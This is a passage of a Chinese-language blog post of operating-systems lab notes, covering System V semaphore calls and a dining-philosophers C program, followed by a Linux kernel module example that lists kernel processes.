class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"实验二-进程同步\"><a href=\"#实验二-进程同步\" class=\"headerlink\" title=\"实验二 进程同步\"></a>实验二 进程同步</h2><p>为了简化对多个信号量的操作，Linux系统中提出了信号量集的概念。一个信号量集对象中可以容纳多个信号量，System V 信号量的分配和操作是以信号量集为单位的。</p>\n<p><strong>进程利用信号量获得共享资源的步骤</strong></p>\n<blockquote>\n<p>使用资源时，进程将该信号量减1(P操作)；</p>\n<p>不再使用资源时，进程将该信号量值加1(V操作)；</p>\n</blockquote>\n<p><strong>创建或打开信号量集</strong></p>\n<p><code>semget()</code> 系统调用创建一个新信号量集或获取一个既有信号量集的表示符。</p>\n<p>函数原型：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/sem.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">semget</span><span class=\"params\">(<span class=\"keyword\">key_t</span> key, <span class=\"keyword\">int</span> nsems, <span class=\"keyword\">int</span> flag)</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p>返回值：成功返回信号量集ID，出错返回-1。<strong>注意：建立信号量集时每个信号量的初始值不确定。</strong></p>\n<p><strong>信号量控制操作</strong></p>\n<p><code>semctl()</code> 系统调用在一个信号量集或集合中的单个信号量上执行各种控制操作。</p>\n<p>函数原型：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/sem.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">semctl</span> <span class=\"params\">(<span class=\"keyword\">int</span> semid, <span class=\"keyword\">int</span> semnum, <span class=\"keyword\">int</span> cmd,  …<span class=\"comment\">/*union semun arg*/</span>)</span></span></span><br></pre></td></tr></table></figure>\n\n<p><code>semnum:</code> 信号量编号或0，表示对指定信号量做控制操作；</p>\n<p><code>cmd:</code>  操作命令，实施的控制操作；</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">IPC_STAT   获取信号量集的属性              IPC_SET   设置信号量集的属性     IPC_RMID  删除信号量集</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">GETVAL   返回 semnum 信号量的值        SETVAL    设置semnum信号量的值</td>\n</tr>\n<tr>\n<td align=\"left\">GETALL   获取所有信号量的值                 SETALL    设置所有信号量的初始值</td>\n</tr>\n</tbody></table>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">union</span> semun&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span>  val;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">semid_ds</span>  *<span class=\"title\">buf</span>;</span></span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span>  *<span class=\"built_in\">array</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>信号量集操作</strong></p>\n<p>semop()系统调用在semid标识的信号量集中的信号量上执行一个或多个up或down操作，可用于进程间的同步和互斥。</p>\n<p>函数原型：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/sem.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">semop</span><span class=\"params\">(<span class=\"keyword\">int</span> semid, struct sembuf *semop, <span class=\"keyword\">size_t</span> nops)</span></span>;</span><br><span class=\"line\">返回：成功返回<span class=\"number\">0</span>，出错返回<span class=\"number\">-1</span>。</span><br><span class=\"line\">Struct sembuf&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> sem_num;   <span class=\"comment\">/*member # in set*/</span></span><br><span class=\"line\">\t<span class=\"keyword\">short</span> \tsem_op; <span class=\"comment\">/*operation(negative, 0, positive*/</span></span><br><span class=\"line\">\t<span class=\"keyword\">short</span>   sem_flg;      <span class=\"comment\">/*IPC_NOWAIT,SEM_UNDO*/</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>组合权限说明</strong></p>\n<p>0666 文件或目录的所有者、所有者所在组、其他用户对该对象均可读、可写 rw-rw-rw-</p>\n<p>0777 文件或目录的所有者、所有者所在组、其他用户对该对象均可读、可写、可执行 rwxrwxrwx</p>\n<p>example.c</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdbool.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/ipc.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/sem.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/wait.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span>\t_SEM_SEMUN_UNDEFINED</span></span><br><span class=\"line\"><span class=\"keyword\">union</span> semun</span><br><span class=\"line\">&#123;       <span class=\"comment\">//semctl() 的第四个参数</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> val;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">semid_ds</span> *<span class=\"title\">buf</span>;</span></span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> *<span class=\"built_in\">array</span>;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">seminfo</span> *__<span class=\"title\">buf</span>;</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span>\tERR_EXIT(m) \\</span></span><br><span class=\"line\">\t<span class=\"keyword\">do</span> &#123; \\</span><br><span class=\"line\">\t\tperror(m); \\</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(EXIT_FAILURE); \\</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">while</span>(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">wait_1chopstick</span><span class=\"params\">(<span class=\"keyword\">int</span> no,<span class=\"keyword\">int</span> semid)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;\t<span class=\"comment\">//p(1) -1，use sourcec</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sembuf</span> <span class=\"title\">sb</span> = &#123;</span>no,<span class=\"number\">-1</span>,<span class=\"number\">0</span>&#125;; <span class=\"comment\">//对第 no 个信号量-1</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> ret;</span><br><span class=\"line\">\tret = semop(semid,&amp;sb,<span class=\"number\">1</span>); <span class=\"comment\">//对semid信号量集按照sb指示对第一个信号进行操作</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ret &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\tERR_EXIT(<span class=\"string\">\"semop\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">free_1chopstick</span><span class=\"params\">(<span class=\"keyword\">int</span> no,<span class=\"keyword\">int</span> semid)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;\t/V(<span class=\"number\">1</span>) +<span class=\"number\">1</span>, release source</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sembuf</span> <span class=\"title\">sb</span> = &#123;</span>no,<span class=\"number\">1</span>,<span class=\"number\">0</span>&#125;; <span class=\"comment\">//对第 no 个信号量 +1</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> ret;</span><br><span class=\"line\">\tret = semop(semid,&amp;sb,<span class=\"number\">1</span>); <span class=\"comment\">//对semid信号量集按照sb指示对第一个信号进行操作</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ret &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\tERR_EXIT(<span class=\"string\">\"semop\"</span>);  </span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span>\tDELAY (rand() % 5 + 1)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">wait_for_2chopstick</span><span class=\"params\">(<span class=\"keyword\">int</span> no,<span class=\"keyword\">int</span> semid)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;\t<span class=\"comment\">// left and right both -1 p(1),use source</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> left = no;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> right = (no + <span class=\"number\">1</span>) % <span class=\"number\">5</span>;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sembuf</span> <span class=\"title\">buf</span>[2] = &#123;</span> <span class=\"comment\">// left and right both -1</span></span><br><span class=\"line\">\t\t&#123;left,<span class=\"number\">-1</span>,<span class=\"number\">0</span>&#125;,</span><br><span class=\"line\">\t\t&#123;right,<span class=\"number\">-1</span>,<span class=\"number\">0</span>&#125;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\tsemop(semid,buf,<span class=\"number\">2</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">free_2chopstick</span><span class=\"params\">(<span class=\"keyword\">int</span> no,<span class=\"keyword\">int</span> semid)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;\t<span class=\"comment\">// left and right both +1,release source</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> left = no;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> right = (no + <span class=\"number\">1</span>) % <span class=\"number\">5</span>;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sembuf</span> <span class=\"title\">buf</span>[2] = &#123;</span></span><br><span class=\"line\">\t\t&#123;left,<span class=\"number\">1</span>,<span class=\"number\">0</span>&#125;,</span><br><span class=\"line\">\t\t&#123;right,<span class=\"number\">1</span>,<span class=\"number\">0</span>&#125;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\tsemop(semid,buf,<span class=\"number\">2</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">philosophere</span><span class=\"params\">(<span class=\"keyword\">int</span> no,<span class=\"keyword\">int</span> semid)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsrand(getpid()); <span class=\"comment\">//初始化随机数发生器</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(;;) &#123;</span><br><span class=\"line\">       <span class=\"meta\">#<span class=\"meta-keyword\">if</span> 0</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d is thinking\\n\"</span>,no);</span><br><span class=\"line\">\t\tsleep(DELAY);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d is hungry\\n\"</span>,no);</span><br><span class=\"line\">\t\twait_for_2chopstick(no,semid);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d is eating\\n\"</span>,no);</span><br><span class=\"line\">\t\tsleep(DELAY);</span><br><span class=\"line\">\t\tfree_2chopstick(no,semid);</span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> left = no;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> right = (no + <span class=\"number\">1</span>) % <span class=\"number\">5</span>; <span class=\"comment\">// 一个哲学家的两边</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d is thinking\\n\"</span>,no);</span><br><span class=\"line\">\t\tsleep(DELAY);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d is hungry\\n\"</span>,no);</span><br><span class=\"line\">\t\twait_1chopstick(left,semid);</span><br><span class=\"line\">\t\tsleep(DELAY);</span><br><span class=\"line\">\t\twait_1chopstick(right,semid);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d is eating\\n\"</span>,no);</span><br><span class=\"line\">\t\tsleep(DELAY);</span><br><span class=\"line\">\t\tfree_1chopstick(left,semid);</span><br><span class=\"line\">        free_1chopstick(right,semid);</span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc,<span class=\"keyword\">char</span> *argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> semid;</span><br><span class=\"line\">\tsemid = semget(IPC_PRIVATE,<span class=\"number\">5</span>,IPC_CREAT | <span class=\"number\">0666</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(semid &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\tERR_EXIT(<span class=\"string\">\"semid\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">union</span> semun su;</span><br><span class=\"line\">\tsu.val = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; <span class=\"number\">5</span>;++i) &#123;</span><br><span class=\"line\">\t\tsemctl(semid,i,SETVAL,su);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> num = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">pid_t</span> pid;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i = <span class=\"number\">1</span>;i &lt; <span class=\"number\">5</span>;++i) &#123;</span><br><span class=\"line\">\t\tpid = fork();</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(pid &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\tERR_EXIT(<span class=\"string\">\"fork\"</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(<span class=\"number\">0</span> == pid) &#123;</span><br><span class=\"line\">\t\t\tnum = i;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tphilosophere(num,semid);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"实验三-添加模块\"><a href=\"#实验三-添加模块\" class=\"headerlink\" title=\"实验三 添加模块\"></a>实验三 添加模块</h2><p>操作系统在处理应用程序时的过程为：</p>\n<p><code>code -&gt; 编辑(debug) -&gt; 编译(产生等待连接的目标程序) -&gt; 连接(确定本模块和其他所需目标模块调用关系，进行主存连接) -&gt; 运行(调入主存启动运行)</code></p>\n<p><strong>Linux的内核模块</strong></p>\n<p>内核模块是Linux内核向外部提供的一个插口，其全称为动态可加载内核模块（Loadable Kernel Module，LKM），简称模块。Linux内核之所以提供模块机制，是因为它本身是一个单内核（monolithic kernel）。单内核的最大优点是效率高，因为所有的内容都集成在一起，但其缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。 </p>\n<p>模块是具有独立功能的程序，它可以被单独编译，但不能独立运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户空间的进程是不同的。模块通常由一组函数和数据结构组成，用来实现一种文件系统、一个驱动程序或其他内核上层的功能。</p>\n<p>总之，模块是一个为内核（从某种意义上来说，内核也是一个模块）或其他内核模块提供使用功能的代码块。</p>\n<ol>\n<li>利用内核模块的动态装载性的优点：<br>将内核映象的尺寸保持在最小，并具有最大的灵活性；便于检验新的内核代码，而不需重新编译内核并重新引导。 </li>\n<li>内核模块的缺点：<br>装入的内核模块和其他内核部分一样，具有相同的访问权限，因此，差的内核模块会导致系统崩溃；为了使内核模块访问所有内核资源，内核必须维护符号表，并在装入和卸载模块时修改这些符号表；有些模块要求利用其他模块的功能，因此，内核要维护模块之间的依赖性。内核必须能够在卸载模块时通知模块，并且要释放分配给模块的内存和中断等资源；内核版本和模块版本的不兼容，也可能导致系统崩溃。</li>\n</ol>\n<p><strong>相关操作说明</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a、必需模块函数</span><br><span class=\"line\">加载函数    module_init(hello_init);  </span><br><span class=\"line\">卸载函数    module_exit(hello_exit);</span><br><span class=\"line\"></span><br><span class=\"line\">b、可选模块函数</span><br><span class=\"line\">MODULE_LICENSE(“*******”);    许可证申明</span><br><span class=\"line\">MODULE_AUTHOR(“********”);    作者申明</span><br><span class=\"line\">MODELE_DESCRIPTION(“***”);    模块描述</span><br><span class=\"line\">MODULE_VERSION(“V1<span class=\"number\">.0</span>”);       模块版本</span><br><span class=\"line\">MODULE_ALIAS(<span class=\"string\">\"*********\"</span>);    模块别名</span><br><span class=\"line\">c、加载内核模块</span><br><span class=\"line\">载入模块使用insmod命令：</span><br><span class=\"line\"><span class=\"meta\">#insmod hello.ko</span></span><br><span class=\"line\">卸载内核模块使用rmmod命令：</span><br><span class=\"line\"><span class=\"meta\">#rmmod hello</span></span><br><span class=\"line\">查看内核模块使用lsmod命令：</span><br><span class=\"line\"><span class=\"meta\">#lsmod</span></span><br><span class=\"line\">d、查看模块调用printk输出的信息</span><br><span class=\"line\">   终端方式下，模块加载后即可在屏幕上看到；</span><br><span class=\"line\">   图形界面终端下，使用dmesg命令.</span><br></pre></td></tr></table></figure>\n\n<p>设计一个模块，功能是列出系统中所有内核进程的程序名、<code>PID</code> 号和进程状态。主要步骤：<br>    阅读内核源代码，了解进程描述符 <code>task_struct</code> 中与本实验有关的成员项，以及访问进程队列的宏 <code>for_each_process</code>；<br>    编写 <code>readprocess</code> 模块，获取进程信息；<br>    修改 Makefile 文件，编译、安装模块，查看输出信息；<br>    查看模块信息，卸载模块。</p>\n<p>下面是动态添加模块的示例</p>\n<p>readprocess.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;linux/init.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;linux/module.h&gt; //每个模块都要包括的头文件</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;linux/kernel.h&gt; //printk()</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;linux/sched.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;linux/init_task.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">hello_init</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">task_struct</span> *<span class=\"title\">p</span>;</span></span><br><span class=\"line\">\tp = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tp = &amp;init_task;</span><br><span class=\"line\">\tprintk(KERN_ALERT <span class=\"string\">\"名称\\t进程号\\t状态\\t父进程号\\t\"</span>); <span class=\"comment\">////只能使用内核里定义好的C函数，printk会根据日志级别将指定信息输出到控制台或日志文件中，KERN_ALERT会输出到控制台</span></span><br><span class=\"line\">\tfor_each_process(p)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(p-&gt;mm == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tprintk(KERN_ALERT <span class=\"string\">\"%s\\t%d\\t%d\\t%d\\n\"</span>,p-&gt;comm,p-&gt;pid,p-&gt;state,p-&gt;real_parent);&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">hello_exit</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tprintk(KERN_ALERT <span class=\"string\">\"hello world exit\\n\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">module_init(hello_init);</span><br><span class=\"line\">module_exit(hello_exit);</span><br><span class=\"line\">MODULE_LICENSE(<span class=\"string\">\"Dual BSD/GPL\"</span>);</span><br></pre></td></tr></table></figure>\n\n<p>Makefile</p>\n<figure class=\"highlight 